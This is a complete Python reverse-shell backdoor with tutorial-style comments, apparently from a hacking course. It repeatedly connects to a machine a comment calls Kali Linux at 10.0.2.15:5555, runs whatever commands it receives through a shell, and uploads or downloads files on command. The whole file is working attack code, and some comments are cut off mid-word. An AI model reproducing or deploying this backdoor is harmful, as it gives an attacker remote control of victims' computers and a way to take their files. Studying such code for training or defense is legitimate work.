import socket
import time
import json
import subprocess
import os

def reliable_send(data):
        jsondata=json.dumps(data) #fuction will convert subset of python objects>
        s.send(jsondata.encode()) #First data is encoded and then sent to t>
def reliable_recv():
        data=''
        while(True):
                try:
                        data=data+s.recv(1024).decode().rstrip() #Specify a>
                        return json.loads(data) #pasrse a json string and conver>
                except ValueError:
                        continue
def connection():
	while(True):
		# This program starts to connect our kali linux machine every 10 sec
		time.sleep(10)
		try:
			s.connect(('10.0.2.15',5555)) #Connects IP and port
			shell() #This functions Executes Commands
			s.close()
			break
		except:
			connection()
def download_file(file_name):
        f=open(file_name,'wb')  #We store(write) the contents of the file we wa>
        s.settimeout(1) #As it might get stuck and not allow us to downloa>
        chunk=s.recv(1024) #chunk=>small parts of data that we recieve
        while chunk:
                f.write(chunk)
                try:
                        chunk=s.recv(1024)
                except socket.timeout as e:  
                        break
        s.settimeout(None) #Removing the statement target.settimeout(1)
        f.close()

def upload_file(file_name):
	f=open(file_name,'rb')
	s.send(f.read())

def shell():
	while(True):
		command=reliable_recv()
		if command=='quit':
			break
		elif command[:3]=='cd': #We compare the first 3 characters of the command
			os.chdir(command[3:]) # Now we use the rest  of the characters of the command
		# =>.chdir is uesd to change the dir => Ex:cd Desktop
		
		elif command=='clear':
			pass
		elif command[:6]=='upload':
			download_file(command[7:])
		elif command[:8]=='download':
			upload_file(command[9:])
		else:
			execute = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
			result=execute.stdout.read() + execute.stderr.read()
			result=result.decode() #Above 2 lines encode the data but in reliable_send() we want decoded data.
			reliable_send(result)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection() #Start an infinite loop and runs untill it manages to connect
		

